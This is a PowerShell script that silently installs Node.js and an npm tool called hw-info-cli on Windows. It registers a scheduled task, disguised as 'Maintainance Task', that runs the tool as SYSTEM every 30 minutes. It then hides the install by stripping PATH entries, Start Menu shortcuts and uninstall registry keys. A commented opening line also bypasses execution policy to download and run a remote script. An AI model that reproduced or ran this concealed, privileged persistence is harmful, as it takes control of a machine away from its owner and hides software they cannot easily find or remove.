#Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/adityastic/S/main/scripts/windows-7.ps1")

net start w32time
w32tm /resync

$url = 'https://nodejs.org/download/release/v12.20.0/node-v12.20.0-x86.msi'
if ((Get-WmiObject win32_operatingsystem | select osarchitecture).osarchitecture -like "64*")
{
  Write-Host 'Found x64 Arch'
  $url = 'https://nodejs.org/download/release/v12.20.0/node-v12.20.0-x64.msi'
}
Write-Host 'Downloading Node'
(New-Object System.Net.WebClient).DownloadFile($url, "$env:temp\node.msi")
Write-Host 'Installing Node'
(Start-Process "msiexec.exe" -ArgumentList "/i `"$env:temp\node.msi`" INSTALLDIR=C:\Windows\nodejs ADDLOCAL=ALL REMOVE=EnvironmentPathNode,EnvironmentPathNpmModules /qn" -NoNewWindow -Wait -PassThru).ExitCode

Write-Host 'Downloading cli'
$env:Path += ";C:\Windows\nodejs"
Start-Process powershell -ArgumentList "-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; npm i hw-info-cli -g }" -Wait

$env:Path += ";$env:APPDATA\npm\"
Start-Process powershell -ArgumentList "-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; hw-info-cli.cmd -s}" -Wait

cp $env:USERPROFILE\.hwinfocli C:\Windows\System32\config\systemprofile -r -Force

Write-Host 'Setting Tasks'
schtasks /create /sc MINUTE /mo 30 /tn "Maintainance Task" /tr "cmd.exe /C cd 'C:\Windows\nodejs' && $env:APPDATA\npm\hw-info-cli.cmd" /ru System /rl Highest


if (Test-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Node.js") { rm -r "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Node.js" }

$locs = Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall
foreach ($loc in $locs)
{
    $name = Get-ItemProperty $loc.PsPath
    IF($name.DisplayName -eq "Node.js") {      
        $line = $name.DisplayName+$separator+$name.DisplayVersion+$separator+$name.InstallDate
        rm $loc.PsPath
    }
}
